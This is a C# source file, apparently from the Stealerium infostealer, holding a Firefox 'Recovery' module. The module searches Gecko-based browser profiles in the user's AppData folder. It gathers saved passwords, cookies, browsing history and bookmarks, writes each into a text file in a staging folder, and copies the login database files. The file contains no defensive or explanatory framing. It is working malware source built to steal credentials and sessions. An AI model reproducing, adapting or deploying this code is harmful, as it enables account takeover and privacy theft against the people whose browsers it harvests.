using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		string[] sGeckoBrowserPaths = Paths.SGeckoBrowserPaths;
		foreach (string text in sGeckoBrowserPaths)
		{
			try
			{
				string name = new DirectoryInfo(text).Name;
				string text2 = sSavePath + "\\" + name;
				string text3 = Paths.Appdata + "\\" + text;
				if (Directory.Exists(text3 + "\\Profiles"))
				{
					Directory.CreateDirectory(text2);
					List<Bookmark> bBookmarks = CBookmarks.Get(text3);
					List<Cookie> cCookies = CCookies.Get(text3);
					List<Site> sHistory = CHistory.Get(text3);
					List<Password> pPasswords = CPasswords.Get(text3);
					CBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
					CBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
					CBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
					CBrowserUtils.WritePasswords(pPasswords, text2 + "\\Passwords.txt");
					CLogins.GetDbFiles(text3 + "\\Profiles\\", text2);
				}
			}
			catch (Exception ex)
			{
				Logging.Log("Firefox >> Failed to recover data\n" + ex);
			}
		}
	}
}
